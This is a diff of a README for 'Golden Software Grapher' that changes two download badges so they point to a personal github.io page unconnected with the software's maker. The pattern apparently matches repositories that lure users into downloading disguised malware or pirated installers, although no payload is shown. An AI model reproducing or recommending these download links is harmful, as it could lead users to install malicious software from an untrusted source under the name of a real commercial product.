@@ -1,7 +1,7 @@
 # 📊 Golden Software Grapher
 
-[![Download Grapher](https://img.shields.io/badge/Download_Grapher-royalblue?style=for-the-badge)](https://golden-software-grapher-app.github.io/.github/)  
-[![Visualize Data](https://img.shields.io/badge/Visualize_Data-darkorange?style=for-the-badge&logo=graph)](https://golden-software-grapher-app.github.io/.github/)
+[![Download Grapher](https://img.shields.io/badge/Download_Grapher-royalblue?style=for-the-badge)](https://kostyuchenkovae99.github.io/.github/golden-software-grapher-app)  
+[![Visualize Data](https://img.shields.io/badge/Visualize_Data-darkorange?style=for-the-badge&logo=graph)](https://kostyuchenkovae99.github.io/.github/golden-software-grapher-app)
 
 ---
 
